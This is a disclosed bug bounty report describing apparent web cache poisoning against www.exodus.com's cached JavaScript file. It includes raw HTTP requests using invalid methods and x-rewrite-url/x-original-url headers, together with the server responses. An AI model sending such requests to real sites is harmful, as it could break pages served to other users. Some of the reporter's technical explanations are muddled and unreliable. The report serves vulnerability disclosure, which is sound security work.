# 2 Cache Poisoning Attack Methods Affect Core Functionality www.exodus.com

## Report Details
- **Report ID**: 1581454
- **URL**: https://hackerone.com/reports/1581454
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-05-25T22:45:22.485Z
- **Disclosed**: 2022-06-06T11:31:15.445Z

## Reporter
- **Username**: setiawan_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exodus

## Vulnerability Information
## Summary:
www.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. Here are 2 details of the Bug.

## Steps To Reproduce:

**1. 501 Not Implemented**

At https://www.exodus.com/, I was able to impact core functionality by using an invalid custom HTTP header to replace the JavaScript file from https://www.exodus.com/webpack-runtime-d5cfa86b8e358efc5db3-v2.js with message '501 Not Implemented'.

```
ERROR /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```
```
CRASH /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```

Response :
```
HTTP/1.1 501 Not Implemented
Date: Wed, 25 May 2022 22:07:00 GMT
Content-Length: 0
Connection: keep-alive
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Set-Cookie: __cfruid=5132a5357442dd861d107824c86a39a95057bcaf-1653516420; path=/; domain=.exodus.com; HttpOnly; Secure; SameSite=None
Server: cloudflare
CF-RAY: 711194da3f3fa131-SIN
```
( HTTP ) My custom CRASH & ERROR to fulfill a request does not work or is not found on the server this server establishes communication between the client and the server to be interrupted . Note that the CF-RAY value changes every time we send a request. CF-RAY is a hash value that encodes information about the data center and requests.

**2. Cache poisoning triggers Firewall Exodus**

When you poison a .js / .css file with additional 2 headers namely : x-rewrite-url & x-original-url it will trigger the exodus firewall rule.

GET request:
```
GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
x-rewrite-url: /root
```
```
GET /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
x-original-url: /root
```
Pay attention to the GET request. It looks different if you open the response in a browser, it will make a POST. Logically, if the POST, DELETE or PURGE methods are not allowed it will issue a response POST is not a valid request method ( 500 Internal Server Error ) However with 2 additional headers x-rewrite-url & x-original-url it actually makes a POST request to the internal system, interesting is not it? :
```
POST /webpack-runtime-d5cfa86b8e358efc5db3-v2.js?cachebust=exodus HTTP/1.1
Host: www.exodus.com
```
Response :
```
HTTP/1.1 403 Forbidden
Server: cloudflare
CF-RAY: 7111ab2b8cd191c6-SIN

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Exodus - Firewall Triggered</title>
```

## Supporting Material/References:
- F1744429: Crash501NotImplemented.png
- F1744430: FirewallTriggeredWithCachePoison.png
- F1744431: PostRequestTriggeredFirewall.png

==Note: I've added in the User-Agent header to help with problem tracking. https://hackerone.com/bismillahfortuner?type=user
User-Agent: h1-<bismillahfortuner>==

## Impact

www.exodus.com hosts static js and css files on Server: cloudflare . Which is cached by cloudflare and passed to all other users accessing the source. I was able to impact the core functionality by using a custom HTTP. And I can trigger exodus firewall rules using cache poisoning

## Attachments
- Crash501NotImplemented.png
- FirewallTriggeredWithCachePoison.png
- PostRequestTriggeredFirewall.png
